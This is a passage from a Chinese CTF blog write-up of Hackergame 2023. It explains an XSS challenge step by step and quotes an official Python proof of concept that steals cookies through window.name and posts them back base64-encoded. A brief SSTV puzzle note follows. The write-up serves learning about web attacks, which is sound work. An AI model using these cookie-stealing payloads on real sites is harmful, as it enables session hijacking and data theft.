    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"I'll not give you exception message this time."</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="找xss注入点"><a href="#找xss注入点" class="headerlink" title="找xss注入点"></a>找xss注入点</h3><p>进入题目，五道微积分随便交一下，然后提交来到评论界面</p>
<p>告诉我们过滤了<code>&amp;</code> <code>&gt;</code> <code>&lt;</code> <code> &#39;</code> <code>(</code> <code>)</code> <code>.</code> <code>,</code> <code>%</code></p>
<p>ctrl+u发现JavaScript代码</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">      <span class="token keyword">function</span> <span class="token function">updateElement</span><span class="token punctuation">(</span><span class="token parameter">selector<span class="token punctuation">,</span> html</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span>selector<span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> html<span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>

      <span class="token function">updateElement</span><span class="token punctuation">(</span><span class="token string">"#score"</span><span class="token punctuation">,</span> <span class="token string">"你的得分是 &lt;b>0&lt;/b> 分"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">updateElement</span><span class="token punctuation">(</span><span class="token string">"#comment"</span><span class="token punctuation">,</span> <span class="token string">"你留下的评论：（还没有评论）"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>使用 <code>document.querySelector(selector)</code> 来匹配 <code>selector</code> 的第一个元素。然后，通过将其 <code>innerHTML</code> 属性设置为提供的 <code>html</code> 参数的值，实现了将元素的内容替换为新的 HTML 内容</p>
<p>可以知道我们的评论会插入到这个函数的执行过程中</p>
<p>正常情况是：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">updateElement</span><span class="token punctuation">(</span><span class="token string">"#comment"</span><span class="token punctuation">,</span> <span class="token string">"你留下的评论：114514"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>但是我们要是加个双引号进去，就是</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">updateElement</span><span class="token punctuation">(</span><span class="token string">"#comment"</span><span class="token punctuation">,</span> <span class="token string">"你留下的评论：114"</span><span class="token number">514</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/11/03/Hackergame-2023/image-20231207111008982.png" alt="image-20231207111008982"></p>
<p>此时就会产生报错，因为这个时候的语句分隔变成了<code>updateElement(&quot;#comment&quot;, &quot;你留下的评论：114&quot;</code>，后面跟着<code>514&quot;&quot;);</code>，前者会缺少<code>)</code>导致报错</p>
<p>那如果我们的评论为<code>&quot;+ 1 +&quot;</code>，插入后就会是</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">updateElement</span><span class="token punctuation">(</span><span class="token string">"#comment"</span><span class="token punctuation">,</span> <span class="token string">"你留下的评论："</span><span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">+</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>那么就会回显1，说明我们成功插入了自己的内容</p>
<p>接下来的问题就是怎么利用这个点来执行任意JavaScript呢</p>
<p>可以用object的方式来执行js表达式，这里object的key为1</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">updateElement</span><span class="token punctuation">(</span><span class="token string">"#comment"</span><span class="token punctuation">,</span> <span class="token string">"你留下的评论："</span><span class="token operator">+</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token operator">:</span> 某种_js_payload<span class="token punctuation">&#125;</span><span class="token operator">+</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>本地测试一下</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
    <span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token number">1</span><span class="token operator">:</span> <span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/11/03/Hackergame-2023/image-20231207112134255.png" alt="image-20231207112134255"></p>
<p>可以成功执行alert</p>
<p>但是由于题目有字符限制，我们还得想办法构造payload</p>
<h3 id="构造xss-payload"><a href="#构造xss-payload" class="headerlink" title="构造xss payload"></a>构造xss payload</h3><p>题目的限制有：</p>
<ul>
<li>没有互联网连接，受害人只能访问一个没有访问日志的静态网站；</li>
<li>弹窗等 exception 的内容不会提供给攻击者；</li>
<li>唯一一个 XSS 注入点：留言，有相对严格的长度限制与黑名单，但是可以用 <code>&quot;</code> 来逃出字符串。</li>
</ul>
<p>而提示是：Bot 会允许任意弹窗</p>
<p>什么意思呢？我们知道弹窗对应的JavaScript代码是</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> target<span class="token punctuation">,</span> windowFeatures<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>其中第二个参数 <code>target</code> 会设置新的窗口的 <code>window.name</code></p>
<p>本地测试：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"https://www.example.com"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/11/03/Hackergame-2023/image-20231207113040137.png" alt="image-20231207113040137"></p>
<p>现代浏览器的默认行为是不允许弹窗。这里允许弹窗，那么就会新建一个标签页，可以在 console 里面看一下这个标签页的 <code>name</code></p>
<p><img src="/blog/2023/11/03/Hackergame-2023/image-20231207113124991.png" alt="image-20231207113124991"></p>
<p>可以看到就是我们设置的name。而如果是正常打开的网站，那么 <code>name</code> 就是空字符串。</p>
<p>而我们如果在<code>window.name</code>处插入恶意代码（在edge浏览器地址栏测试）</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">javascript</span><span class="token operator">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/11/03/Hackergame-2023/image-20231207113941624.png" alt="image-20231207113941624"></p>
<p>是可以成功执行的</p>
<p>所以，我们可以让bot在跳转的同时，在 <code>name</code> 里面带上我们的信息，而这个信息要有多长就能有多长，从而绕过长度限制</p>
<p>那么就可以构造我们的payload段</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">updateElement</span><span class="token punctuation">(</span><span class="token string">"#comment"</span><span class="token punctuation">,</span> <span class="token string">"你留下的评论："</span><span class="token operator">+</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token operator">:</span> window<span class="token punctuation">.</span>location<span class="token operator">=</span>window<span class="token punctuation">.</span>name<span class="token punctuation">&#125;</span><span class="token operator">+</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这样只要 <code>window.name</code> 以 <code>javascript:</code> 开头，就能执行我们想要的 JavaScript代码</p>
<p>不过<code>.</code>也被过滤了怎么办，实际上<code>window.</code>是可以省略的，比如<code>alert(1)</code> 事实上是 <code>window.alert(1)</code></p>
<p>所以最后的payload是这样</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">updateElement</span><span class="token punctuation">(</span><span class="token string">"#comment"</span><span class="token punctuation">,</span> <span class="token string">"你留下的评论："</span><span class="token operator">+</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token operator">:</span> location<span class="token operator">=</span>name<span class="token punctuation">&#125;</span><span class="token operator">+</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="利用bot实现xss（复现失败）"><a href="#利用bot实现xss（复现失败）" class="headerlink" title="利用bot实现xss（复现失败）"></a>利用bot实现xss（复现失败）</h3><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">下面的 bot 模拟了这样一个过程：你可以提交一段 HTML 代码，bot 会在本地启动一个 HTTP 服务器，然后 bot 会访问上面的练习网站，登录后在 cookie 中加入 JavaScript 可以访问到的经过 URL encode 之后的 flag，然后访问你的站点。Bot 不会输出任何网页内容。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>我们先把要插入的html文件写到bot里面</p>
<p>官方的poc：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> base64
<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> unquote_plus
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>

token <span class="token operator">=</span> <span class="token string">"3854:MEUCIQC//2P/AltLuae+obq6027zxeJwjaD6VvVEo0djWN0f9AIgMr8lZglJH5DCXqADwcmR83KXkDIjzPKLW876k0PamA0="</span>
hostname <span class="token operator">=</span> <span class="token string">"202.38.93.111"</span>

s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://</span><span class="token interpolation"><span class="token punctuation">&#123;</span>hostname<span class="token punctuation">&#125;</span></span><span class="token string">:10051/?token="</span></span> <span class="token operator">+</span> token<span class="token punctuation">)</span>
html <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;script>
var victim=window.open("http://web/result", 'javascript:fetch("/result", &#123;"headers": &#123;"Content-Type": "application/x-www-form-urlencoded",&#125;,"body": `comment=$&#123;btoa(document.cookie.substring(%start%, %end%))&#125;`,"method": "POST",&#125;);')
&lt;/script>
EOF"""</span>

<span class="token comment"># 先做题</span>
s<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://</span><span class="token interpolation"><span class="token punctuation">&#123;</span>hostname<span class="token punctuation">&#125;</span></span><span class="token string">:10051"</span></span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">"q1"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"q2"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"q3"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"q4"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"q5"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">post_payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    s<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://</span><span class="token interpolation"><span class="token punctuation">&#123;</span>hostname<span class="token punctuation">&#125;</span></span><span class="token string">:10051/result"</span></span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"comment"</span><span class="token punctuation">:</span> <span class="token string">'"+&#123;a: location=name&#125;+"'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

post_payload<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">bot</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">:</span>
    r <span class="token operator">=</span> remote<span class="token punctuation">(</span>hostname<span class="token punctuation">,</span> <span class="token number">10053</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"token:"</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>token<span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"服务器提供这个文件。\n"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>html<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"%start%"</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>start<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"%end%"</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>end<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment"># r.interactive()</span>
    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"bye!\n"</span><span class="token punctuation">)</span>

bot<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">)</span>


res <span class="token operator">=</span> <span class="token string">""</span>
<span class="token comment"># receive our data</span>
<span class="token keyword">def</span> <span class="token function">read_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://</span><span class="token interpolation"><span class="token punctuation">&#123;</span>hostname<span class="token punctuation">&#125;</span></span><span class="token string">:10051/result"</span></span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token string">"你留下的评论"</span> <span class="token keyword">in</span> i<span class="token punctuation">:</span>
            text <span class="token operator">=</span> i<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"："</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'");'</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span>
            x <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> x
res <span class="token operator">+=</span> read_contents<span class="token punctuation">(</span><span class="token punctuation">)</span>
post_payload<span class="token punctuation">(</span><span class="token punctuation">)</span>
bot<span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">)</span>
res <span class="token operator">+=</span> read_contents<span class="token punctuation">(</span><span class="token punctuation">)</span>
post_payload<span class="token punctuation">(</span><span class="token punctuation">)</span>
bot<span class="token punctuation">(</span><span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">)</span>
res <span class="token operator">+=</span> read_contents<span class="token punctuation">(</span><span class="token punctuation">)</span>
post_payload<span class="token punctuation">(</span><span class="token punctuation">)</span>
bot<span class="token punctuation">(</span><span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">71</span><span class="token punctuation">)</span>
res <span class="token operator">+=</span> read_contents<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>unquote_plus<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>但是我脚本跑不出来。。</p>
<hr>
<h1 id="General"><a href="#General" class="headerlink" title="General"></a>General</h1><h2 id="虫"><a href="#虫" class="headerlink" title="虫"></a>虫</h2><blockquote>
<p>sstv</p>
</blockquote>
<p>正好前几天laffey给我出了个类似的东西（</p>
<p>工具准备：MMSSTV和e2esoft虚拟声卡，把声卡输入的默认值改为e2esoft的Line in</p>
<p>播放即可</p>
<p><img src="/blog/2023/11/03/Hackergame-2023/image-20231104104811180.png" alt="image-20231104104811180"></p>

    </div>
    
    
    
    
    
    
    
</div>

            </div>
        </transition>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/blog/js/main.js"></script>
    
    




    
    

<div id="vcomments"></div>

<script src="/blog/js/lib/valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
        visitor: 'true',
        placeholder: '写点什么吧(●ˇ∀ˇ●)',
        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
    });
</script>

    <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2025 雲流のLowest World
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;C1oudfL0w0
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>